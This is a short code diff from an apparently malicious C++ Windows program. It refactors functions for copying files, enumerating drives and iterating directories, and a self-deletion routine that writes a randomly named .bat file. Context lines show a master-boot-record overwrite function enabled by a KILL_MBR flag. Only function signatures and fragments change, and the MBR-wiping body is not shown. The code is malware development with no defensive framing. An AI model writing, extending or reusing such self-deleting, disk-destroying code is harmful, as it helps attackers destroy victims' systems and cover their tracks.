@@ -3,8 +3,7 @@
 
 BOOL fnCopyFileW(
 	_In_ LPCWSTR lpAdpn,
-	_In_ LPCWSTR lpAdfn,
-	_In_ WCHAR szMfn[]
+	_In_ LPCWSTR lpAdfn
 ) {
 	if (CreateDirectory(lpAdpn, NULL)) {
 		if (CopyFile(szMfn, lpAdfn, FALSE)) {
@@ -34,7 +33,7 @@ BOOL fnCopyFileW(
 
 // TODO: Fix uninitialized or just change to _Inout_ instead
 BOOL fnDriveEnumeratorW(
-	_Out_ std::vector<std::wstring>* vszDrives
+	_Inout_ std::vector<std::wstring>* vszDrives
 ) {
 	WCHAR szDrives[nDRIVES];
 	std::wstring szDrive;
@@ -56,16 +55,16 @@ BOOL fnDriveEnumeratorW(
 		return TRUE;
 	} else {
 		fnERRORHANDLERW(L"Couldn't enumerate Drives", NULL, L"GetLogicalDriveStringsW", MB_ICONERROR);
-
 		return FALSE;
 	}
 }
 
+// TODO: Use Pointers
 BOOL fnDirectoryIteratorW(
-	_In_ std::wstring szDir,
-	_In_ std::wstring szMask,
-	_Out_ std::vector<std::wstring>* vszDir,
-	_Out_ std::vector<std::wstring>* vszFile
+	_In_    std::wstring               szDir,
+	_In_    std::wstring               szMask,
+	_Inout_ std::vector<std::wstring>* vszDir,
+	_Inout_ std::vector<std::wstring>* vszFile
 ) {
 	WIN32_FIND_DATA w32Fd;
 	std::wstring szW32fd = szDir + L"\\" + szMask;
@@ -114,10 +113,7 @@ BOOL fnOverwriteMBR(VOID) {
 }
 #endif // KILL_MBR
 
-BOOL fnSelfDeleteW(
-	_In_ WCHAR szCd[],
-	_In_ WCHAR szMfn[]
-) {
+BOOL fnSelfDeleteW(VOID) {
 	DWORD dwBufferSize = NULL;
 	HANDLE hHeap = GetProcessHeap();
 	std::wstring szBat = szCd + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".bat";
